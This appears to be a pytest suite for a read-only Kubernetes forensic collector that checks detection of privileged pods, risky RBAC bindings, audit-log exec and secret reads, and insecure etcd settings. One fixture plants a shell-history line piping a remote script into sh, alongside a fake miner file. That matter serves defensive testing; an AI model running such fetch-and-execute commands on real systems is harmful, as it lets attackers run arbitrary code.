"""Unit tests for the on-prem Kubernetes collectors (API plane + node plane).

API-plane collectors run against a fake client factory; node-plane collectors run against a
real :class:`NodeAccess` pointed at a temporary directory laid out like a host root. No real
cluster, kubeconfig, crictl, or journalctl is required.
"""

from __future__ import annotations

import json
from datetime import UTC, datetime
from pathlib import Path

import pytest
from collector.clouds.kubernetes.client_factory import KubeAccessDenied
from collector.clouds.kubernetes.node import NodeAccess
from collector.engine.api.kubernetes.api_plane.audit_posture import AuditPostureCollector
from collector.engine.api.kubernetes.api_plane.cluster_state import ClusterStateCollector
from collector.engine.api.kubernetes.api_plane.events import EventsCollector
from collector.engine.api.kubernetes.api_plane.pod_logs import PodLogsCollector
from collector.engine.api.kubernetes.api_plane.rbac import RbacCollector
from collector.engine.api.kubernetes.node_plane.apiserver_audit import ApiserverAuditCollector
from collector.engine.api.kubernetes.node_plane.checkpoint import CheckpointCollector
from collector.engine.api.kubernetes.node_plane.container_fs import ContainerFsCollector
from collector.engine.api.kubernetes.node_plane.container_logs import ContainerLogsCollector
from collector.engine.api.kubernetes.node_plane.control_plane_logs import ControlPlaneLogsCollector
from collector.engine.api.kubernetes.node_plane.etcd import EtcdCollector
from collector.engine.api.kubernetes.node_plane.node_os import NodeOsCollector
from collector.lib.base import assert_readonly
from collector.lib.models import CollectionContext, GapReason, SourceStatus, TimeWindow


# --------------------------------------------------------------------------------------------
# Fakes / fixtures
# --------------------------------------------------------------------------------------------
class FakeFactory:
    """API-plane double: list_* return canned values (or raise a canned exception)."""

    def __init__(self, node=None, responses=None, pod_logs=None):
        self.node = node if node is not None else NodeAccess(root=Path("/nonexistent-root"))
        self.responses = responses or {}
        self.pod_logs = pod_logs or {}

    def __getattr__(self, name):
        if name.startswith("list_"):
            def _list():
                val = self.responses.get(name, [])
                if isinstance(val, Exception):
                    raise val
                return list(val)

            return _list
        raise AttributeError(name)

    def read_pod_log(self, ns, pod, container, previous=False):
        return self.pod_logs.get((ns, pod, container, previous), "")


def _ctx(tmp_path: Path, cf, *, window=None, params=None) -> CollectionContext:
    staging = tmp_path / "staging"
    (staging / "sources").mkdir(parents=True, exist_ok=True)
    return CollectionContext(
        cloud="kubernetes",
        account_id="on-prem-cluster",
        regions=[],
        time_window=window or TimeWindow(),
        staging=staging,
        case_id="CASE-K8S",
        client_factory=cf,
        artifact_parameters=params or {},
    )


def _node_root(tmp_path: Path) -> Path:
    root = tmp_path / "host"
    root.mkdir(parents=True, exist_ok=True)
    return root


def _write(root: Path, host_path: str, content: str) -> Path:
    p = root / host_path.lstrip("/")
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content, encoding="utf-8")
    return p


# --------------------------------------------------------------------------------------------
# API plane
# --------------------------------------------------------------------------------------------
def test_events_flags_reasons_and_reports_retention_expired(tmp_path: Path) -> None:
    events = [
        {"reason": "OOMKilling", "message": "killed", "type": "Warning"},
        {"reason": "Scheduled", "message": "ok", "type": "Normal"},
    ]
    cf = FakeFactory(node=NodeAccess(root=_node_root(tmp_path)), responses={"list_events": events})
    # Incident window starts well before the default 1h TTL → retention gap.
    window = TimeWindow(
        since=datetime(2020, 1, 1, tzinfo=UTC), until=datetime(2020, 1, 2, tzinfo=UTC)
    )
    result = EventsCollector(_ctx(tmp_path, cf, window=window)).collect()

    assert result.record_count == 2
    reasons = {g[1] for g in result.gaps}
    assert GapReason.RETENTION_EXPIRED in reasons
    assert result.status == SourceStatus.PARTIAL


def test_events_access_denied_is_a_gap_not_a_crash(tmp_path: Path) -> None:
    cf = FakeFactory(responses={"list_events": KubeAccessDenied("list events", "forbidden")})
    result = EventsCollector(_ctx(tmp_path, cf)).collect()
    assert result.status == SourceStatus.EMPTY
    assert result.gaps[0][1] == GapReason.ACCESS_DENIED


def test_audit_posture_disabled_is_critical_gap(tmp_path: Path) -> None:
    root = _node_root(tmp_path)
    _write(
        root,
        "/etc/kubernetes/manifests/kube-apiserver.yaml",
        "spec:\n  containers:\n  - command:\n    - kube-apiserver\n",
    )
    cf = FakeFactory(node=NodeAccess(root=root))
    result = AuditPostureCollector(_ctx(tmp_path, cf)).collect()
    assert any(g[1] == GapReason.LOGGING_NOT_CONFIGURED for g in result.gaps)


def test_audit_posture_enabled_reads_flags(tmp_path: Path) -> None:
    root = _node_root(tmp_path)
    _write(
        root,
        "/etc/kubernetes/manifests/kube-apiserver.yaml",
        "spec:\n  containers:\n  - command:\n    - kube-apiserver\n"
        "    - --audit-log-path=/var/log/kubernetes/audit/audit.log\n"
        "    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml\n",
    )
    _write(
        root,
        "/etc/kubernetes/audit-policy.yaml",
        "rules:\n- level: RequestResponse\n  resources:\n  - group: ''\n"
        "    resources: ['secrets','pods/exec']\n",
    )
    cf = FakeFactory(node=NodeAccess(root=root))
    result = AuditPostureCollector(_ctx(tmp_path, cf)).collect()
    assert result.status == SourceStatus.COLLECTED
    assert not any(g[1] == GapReason.LOGGING_NOT_CONFIGURED for g in result.gaps)


def test_cluster_state_detects_suspicious_pod(tmp_path: Path) -> None:
    pod = {
        "metadata": {"namespace": "prod", "name": "evil"},
        "spec": {
            "host_network": True,
            "volumes": [{"host_path": {"path": "/"}}],
            "containers": [
                {"name": "c", "image": "docker.io/evil:latest", "security_context": {"privileged": True}}
            ],
        },
    }
    cf = FakeFactory(responses={"list_pods": [pod]})
    assert ClusterStateCollector(_ctx(tmp_path, cf)).collect().record_count >= 1

    suspicious = tmp_path / "staging" / "sources" / "k8s_cluster_state" / "suspicious_pods.json"
    assert suspicious.exists()
    data = json.loads(suspicious.read_text())
    assert data and data[0]["pod"] == "prod/evil"
    findings = " ".join(data[0]["findings"])
    assert "privileged:c" in findings and "hostNetwork" in findings


def test_cluster_state_denied_kind_becomes_gap_and_continues(tmp_path: Path) -> None:
    cf = FakeFactory(
        responses={
            "list_pods": [{"metadata": {"namespace": "d", "name": "p"}, "spec": {}}],
            "list_secrets_metadata": KubeAccessDenied("list secrets", "forbidden"),
        }
    )
    result = ClusterStateCollector(_ctx(tmp_path, cf)).collect()
    assert result.status == SourceStatus.PARTIAL
    assert any(g[1] == GapReason.ACCESS_DENIED and "secrets" in g[2] for g in result.gaps)
    assert result.record_count >= 1  # pods still collected


def test_rbac_flags_cluster_admin_and_anonymous(tmp_path: Path) -> None:
    cluster_roles = [{"metadata": {"name": "cluster-admin"}, "rules": [{"verbs": ["*"], "resources": ["*"]}]}]
    crbs = [
        {
            "metadata": {"name": "admin-binding"},
            "role_ref": {"kind": "ClusterRole", "name": "cluster-admin"},
            "subjects": [{"kind": "User", "name": "mallory"}],
        },
        {
            "metadata": {"name": "anon-binding"},
            "role_ref": {"kind": "ClusterRole", "name": "view"},
            "subjects": [{"kind": "User", "name": "system:anonymous"}],
        },
    ]
    cf = FakeFactory(
        responses={"list_cluster_roles": cluster_roles, "list_cluster_role_bindings": crbs}
    )
    assert RbacCollector(_ctx(tmp_path, cf)).collect().status in (
        SourceStatus.COLLECTED,
        SourceStatus.PARTIAL,
    )
    dangerous = json.loads(
        (tmp_path / "staging" / "sources" / "k8s_rbac" / "dangerous_bindings.json").read_text()
    )
    anon = json.loads(
        (tmp_path / "staging" / "sources" / "k8s_rbac" / "anonymous_bindings.json").read_text()
    )
    assert any(d["binding"] == "ClusterRoleBinding/admin-binding" for d in dangerous)
    assert any(a["binding"] == "anon-binding" for a in anon)


def test_pod_logs_reads_previous_and_current(tmp_path: Path) -> None:
    pods = [{"metadata": {"namespace": "prod", "name": "web"}, "spec": {"containers": [{"name": "app"}]}}]
    cf = FakeFactory(
        responses={"list_pods": pods},
        pod_logs={
            ("prod", "web", "app", False): "line current\n",
            ("prod", "web", "app", True): "line previous\n",
        },
    )
    result = PodLogsCollector(_ctx(tmp_path, cf)).collect()
    assert result.record_count == 2  # current + previous
    assert result.status == SourceStatus.COLLECTED


# --------------------------------------------------------------------------------------------
# Node plane
# --------------------------------------------------------------------------------------------
def test_apiserver_audit_parses_and_detects(tmp_path: Path) -> None:
    root = _node_root(tmp_path)
    _write(
        root,
        "/etc/kubernetes/manifests/kube-apiserver.yaml",
        "spec:\n  containers:\n  - command:\n    - kube-apiserver\n"
        "    - --audit-log-path=/var/log/kubernetes/audit/audit.log\n",
    )
    exec_event = {
        "kind": "Event", "stage": "ResponseComplete", "verb": "create",
        "user": {"username": "mallory"},
        "objectRef": {"resource": "pods", "subresource": "exec", "namespace": "prod", "name": "web"},
        "requestReceivedTimestamp": "2026-06-11T10:00:00Z", "stageTimestamp": "2026-06-11T10:00:01Z",
    }
    secret_event = {
        "kind": "Event", "stage": "ResponseComplete", "verb": "get",
        "user": {"username": "mallory"},
        "objectRef": {"resource": "secrets", "namespace": "prod", "name": "db"},
        "stageTimestamp": "2026-06-11T10:00:02Z",
    }
    _write(
        root, "/var/log/kubernetes/audit/audit.log",
        json.dumps(exec_event) + "\n" + json.dumps(secret_event) + "\n",
    )
    cf = FakeFactory(node=NodeAccess(root=root))
    result = ApiserverAuditCollector(_ctx(tmp_path, cf)).collect()
    assert result.record_count == 2
    dets = json.loads(
        (tmp_path / "staging" / "sources" / "k8s_apiserver_audit" / "detections.json").read_text()
    )
    assert len(dets["exec_or_attach"]) == 1
    assert len(dets["secret_read"]) == 1


def test_apiserver_audit_missing_log_is_critical_gap(tmp_path: Path) -> None:
    cf = FakeFactory(node=NodeAccess(root=_node_root(tmp_path)))
    result = ApiserverAuditCollector(_ctx(tmp_path, cf)).collect()
    assert result.status == SourceStatus.EMPTY
    assert result.gaps[0][1] == GapReason.LOGGING_NOT_CONFIGURED


def test_container_logs_reads_from_node(tmp_path: Path) -> None:
    root = _node_root(tmp_path)
    _write(root, "/var/log/pods/prod_web_uid123/app/0.log", "hello from node\n")
    cf = FakeFactory(node=NodeAccess(root=root))
    result = ContainerLogsCollector(_ctx(tmp_path, cf)).collect()
    assert result.record_count == 1
    assert result.status == SourceStatus.COLLECTED


def test_control_plane_flags_unexpected_manifest(tmp_path: Path) -> None:
    root = _node_root(tmp_path)
    _write(root, "/etc/kubernetes/manifests/kube-apiserver.yaml", "apiVersion: v1\n")
    _write(root, "/etc/kubernetes/manifests/evil.yaml", "apiVersion: v1\nkind: Pod\n")
    cf = FakeFactory(node=NodeAccess(root=root))
    result = ControlPlaneLogsCollector(_ctx(tmp_path, cf)).collect()
    assert any("evil.yaml" in g[2] for g in result.gaps)


def test_node_os_captures_logs_and_shadow_metadata(tmp_path: Path) -> None:
    root = _node_root(tmp_path)
    _write(root, "/var/log/auth.log", "Jun 11 login\n")
    _write(root, "/etc/passwd", "root:x:0:0:root:/root:/bin/bash\n")
    _write(root, "/etc/shadow", "root:$6$hash:19000:0:99999:7:::\n")
    cf = FakeFactory(node=NodeAccess(root=root))
    result = NodeOsCollector(_ctx(tmp_path, cf)).collect()
    assert result.status == SourceStatus.COLLECTED
    config = json.loads(
        (tmp_path / "staging" / "sources" / "k8s_node_os" / "config.json").read_text()
    )
    assert config["shadow"]["present"] is True
    assert "root" in config["shadow"]["usernames"]
    assert "sha256" in config["shadow"]  # hashed, not exposed
    # The shadow password hash itself is never written to config.
    assert "$6$hash" not in json.dumps(config)


def test_etcd_posture_flags_disabled_cert_auth(tmp_path: Path) -> None:
    root = _node_root(tmp_path)
    _write(
        root,
        "/etc/kubernetes/manifests/etcd.yaml",
        "spec:\n  containers:\n  - command:\n    - etcd\n"
        "    - --client-cert-auth=false\n"
        "    - --listen-client-urls=https://0.0.0.0:2379\n",
    )
    cf = FakeFactory(node=NodeAccess(root=root))
    result = EtcdCollector(_ctx(tmp_path, cf)).collect()
    joined = " ".join(g[2] for g in result.gaps)
    assert "client certificate auth" in joined
    assert "non-loopback" in joined


def test_checkpoint_without_targets_is_skipped(tmp_path: Path) -> None:
    cf = FakeFactory(node=NodeAccess(root=_node_root(tmp_path)))
    result = CheckpointCollector(_ctx(tmp_path, cf)).collect()
    assert result.status == SourceStatus.SKIPPED


def test_container_fs_on_docker_runtime_is_not_supported(tmp_path: Path) -> None:
    root = _node_root(tmp_path)
    (root / "var/lib/docker").mkdir(parents=True)  # runtime detected as docker
    cf = FakeFactory(node=NodeAccess(root=root))
    params = {"k8s_container_fs": {"container_ids": ["abc"]}}
    result = ContainerFsCollector(_ctx(tmp_path, cf, params=params)).collect()
    assert result.status == SourceStatus.SKIPPED
    assert result.gaps[0][1] == GapReason.NOT_SUPPORTED


def test_container_fs_extracts_upperdir_and_hashes(tmp_path: Path) -> None:
    root = _node_root(tmp_path)
    (root / "var/lib/containerd").mkdir(parents=True)  # containerd runtime
    upper = "/var/lib/containerd/io.containerd.snapshotter/1/fs"
    _write(root, f"{upper}/tmp/miner", "malware")
    _write(root, f"{upper}/root/.bash_history", "curl evil.sh | sh\n")
    cf = FakeFactory(node=NodeAccess(root=root))
    params = {"k8s_container_fs": {"container_upperdirs": [upper]}}
    result = ContainerFsCollector(_ctx(tmp_path, cf, params=params)).collect()
    assert result.status == SourceStatus.COLLECTED
    config = json.loads(
        (tmp_path / "staging" / "sources" / "k8s_container_fs" / "config.json").read_text()
    )
    kinds = {m["kind"] for m in config["manifest"]}
    assert "shell_history" in kinds and "changed_file" in kinds
    assert all(m.get("sha256") for m in config["manifest"])


# --------------------------------------------------------------------------------------------
# Registry / read-only guard
# --------------------------------------------------------------------------------------------
def test_registry_order_is_volatility_ordered() -> None:
    from collector.engine.registry import kubernetes as kreg

    _, order = kreg.get()
    assert order[0] == "k8s_events"  # most perishable first
    assert order.index("k8s_apiserver_audit") < order.index("k8s_cluster_state")


def test_all_kubernetes_required_actions_are_readonly() -> None:
    from collector.engine.registry import kubernetes as kreg

    registry, _ = kreg.get()
    for name, cls in registry.all().items():
        offenders = assert_readonly(cls.required_actions)
        assert not offenders, f"{name} declares mutating actions: {offenders}"


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-v"]))
